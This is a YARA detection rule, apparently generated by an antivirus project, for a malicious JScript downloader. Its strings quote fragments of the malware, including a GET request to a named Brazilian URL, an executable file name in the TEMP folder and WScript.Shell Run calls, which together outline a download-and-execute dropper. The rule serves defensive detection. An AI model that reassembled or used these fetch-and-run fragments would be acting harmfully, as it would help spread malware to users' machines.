rule sig_20160329_43239001c930b7ee83263eecc73b9888 {
  meta:
    description = "datamaliciousorder - file 20160329_43239001c930b7ee83263eecc73b9888.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d6fff13da6bd4cf70b4e6e3f654c4544e44f13ca06796c2425539ed96e6d3a35"

  strings:
    $s1  = "f[kb](\"GET\", \"http://lojaagrometal.com.br/mi3sa\", false);" fullword ascii
    $s2  = "function v() {return dx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6mzBBNdOeFGcX.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[b0](V() * 11); if (f[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var dx = function b() {return WScript[B](\"WScript.Shell\");}(), N = 11;" fullword ascii
    $s5  = "function ls(Yw, Zx){dG = dG * 1; return Yw - Zx;};" fullword ascii
    $s6  = "function fC(){return \"\" + km;};" fullword ascii
    $s7  = "function am(i0){dx[\"Run\"](i0, dG, dG);};" fullword ascii
    $s8  = "function Vl() {return ((M == true) && (M == U)) ? 1 : dG;};" fullword ascii
    $s9  = "var P = new this[\"Date\"]();" fullword ascii
    $s10 = "function i()" fullword ascii
    $s11 = " while (ze){" fullword ascii
    $s12 = "function WF(w) {var hF = (1, 2, 3, 4, 5, w); return hF;};" fullword ascii
    $s13 = "function V(){return 22;};" fullword ascii
    $s14 = "function Mz(){return B;};" fullword ascii
    $s15 = "return ls(qE, X);" fullword ascii
    $s16 = "M = true; " fullword ascii
    $s17 = "U = true; " fullword ascii
    $s18 = "var Di = false;" fullword ascii
    $s19 = "var U = false;" fullword ascii
    $s20 = "} catch(Hu){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}